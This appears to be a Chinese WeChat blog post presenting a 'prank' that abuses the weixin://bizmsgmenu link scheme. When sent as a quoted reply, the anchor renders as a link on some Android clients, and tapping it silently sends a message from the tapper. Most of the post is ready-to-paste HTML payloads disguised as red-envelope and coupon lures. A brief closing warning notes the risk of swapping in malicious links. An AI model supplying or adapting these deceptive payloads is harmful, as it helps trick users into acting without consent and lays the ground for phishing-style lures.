> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3NTU3NTY0Nw==&mid=2247489978&idx=1&sn=822ebed3b5c7e945a1160e02b6173028

#  【数据安全篇】微信"引用"消息变成私信好友XSS整蛊  
 网络安全与取证研究   2025-07-14 00:00  
  
**1**  
  
**使用方法："引用"消息，发送代码**  
  
  
不管是微信  
群聊还是私聊，只要  
引用微信消息然后发这段  
"  
HTML代码"，别人  
点击这个消息  
后，就会自动  
私信发送给好友！！！  
并不会切换到好友聊天界面，是无感的，所以操作需要谨慎！！！  
  
  
目前只对部分Android系统有用，电脑端和iOS端都会显示源码！  
  
Android端：显示源码，有  
超链接蓝色字体。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g0qdRkVkqNwkCOt391sibh4pZMD6VXSXYXia6G4ibDoVMYJvdAoos86M3nFZf7fa1OxledwlxsxUBoD6ic8mPSo2Lg/640?wx_fmt=png&from=appmsg "")  
  
  
Windows电脑端  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g0qdRkVkqNwkCOt391sibh4pZMD6VXSXYvpqColjVVzvealVnnk45GSc0OYBHIC3Xu3B6zzSLXBSVGSadowk9bg/640?wx_fmt=png&from=appmsg "")  
  
  
好友显示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g0qdRkVkqNwkCOt391sibh4pZMD6VXSXYEydfTS9HgpPaFZyqgBWicRJCJIiaK7AiatTLwMarkywPRXvONZ7jdxlMg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g0qdRkVkqNwkCOt391sibh4pZMD6VXSXYJDNvtKAjicVzLS07ichNzKWMB4btJd0tVaQmNMBlEklBSmEU2ZjHm3dg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**2**  
  
**源码：直接"引用" 群/好友消息，粘贴源码即可**  
  
  
里面的文字可根据场景自定义替换：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g0qdRkVkqNwkCOt391sibh4pZMD6VXSXYouI9E4yt1UW7DXZCseOCBRSrjerp99icsTpOpxx0uianOCh9B1NnOMBg/640?wx_fmt=png&from=appmsg "")  
  
  

```
<a 
href=&#34;weixin://bizmsgmenu
?msgmenucontent=【实际发送的信息】
&msgmenuid=960&#34;>【显示的信息】</a >
```

  
  
  
  
<a  
  
href="weixin://bizmsgmenu  
  
?msgmenucontent=你是我见过最帅的人  
  
&msgmenuid=960">点击领取红包  
🧧  
</a>  
  
  
  
<a  
  
href="weixin://bizmsgmenu  
  
?msgmenucontent=把你的不开心通通赶走  
  
&msgmenuid=960">点击有惊喜</a>  
  
  
  
<a  
  
href="weixin://bizmsgmenu  
  
?msgmenucontent=爸爸  
  
&msgmenuid=960">点击领取今日份红包  
🧧  
</a>  
  
  
  
<a  
  
href="weixin://bizmsgmenu  
  
?msgmenucontent=你是我见过最帅的人  
  
&msgmenuid=960">点击领取美团大额优惠券  
🧧  
</a>  
  
  
  
<a  
  
href="weixin://bizmsgmenu  
  
?msgmenucontent=哎，又被骗了，我要加强学习了，也送你一份学习资料  
https://flk.npc.gov.cn/index.html  
  
&msgmenuid=960">点击领取红包🧧</a>   
  
  
  
**3**  
  
**注意事项**  
  
  
增强防范安全  
：如果是替换的是  
超链接/病毒链接/获取位置信息等……  
，是否会自动下载安装病毒文件、获取手机数据、位置信息等，造成数据泄露等风险。  
  
陌生信息不要乱点！！！  
  
  
书写片面，纯粹做个记录，有错漏之处欢迎指正！  
  
【声明：欢迎转发收藏，个人创作不易，喜欢记得点点赞！！！转载引用请注明出处，著作所有权归 [蘇小沐] 所有】  
  
【注：共享资源收集于官网或互联网公开材料，仅供学习研究，如有侵权请联系删除，谢谢！】  
<table><tbody><tr><td data-colwidth="514"><section style="margin-bottom: 0px;line-height: normal;"><span leaf=""><span textstyle="" style="color: rgb(0, 128, 255);">记录</span></span></section></td></tr><tr><td data-colwidth="514"><section style="line-height: normal;"><span leaf=""><span textstyle="" style="color: rgb(0, 128, 255);">开始编辑：2025年 07月 13日</span></span></section></td></tr><tr><td data-colwidth="514"><section style="line-height: normal;"><span leaf=""><span textstyle="" style="color: rgb(0, 128, 255);">最后编辑：2025年 07月 13日</span></span></section></td></tr></tbody></table>  
**END**  
  
  
  
关注我，了解更多取证知识，记得点赞+在  
看！![](https://mmbiz.qpic.cn/mmbiz_gif/kw2nrMk65sdm2h1H7HL0PuJZltDnjKlKJKwx2SOicHZ6ciceNaAhompextcznbssviakCvDN8S2yJxhDVDuZhxSFw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&random=0.7923755508015693&random=0.6074162352494825&random=0.7255493766092054 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RITPxDQz30icticGDszvMCTbvDxbl8zxyibqkfOTIRXJQVU3YEHicR6AiatHvlnPic7qayibiazKoJV54NVDMmL1uVqsGg/640?wx_fmt=png&random=0.008279855111830159&random=0.8417589579850686&random=0.7406363082812077&random=0.10974797073162001&random=0.07292006660739969&wxfrom=5&wx_lazy=1&wx_co=1&random=0.9329563926201925 "")  
  
  
  
  
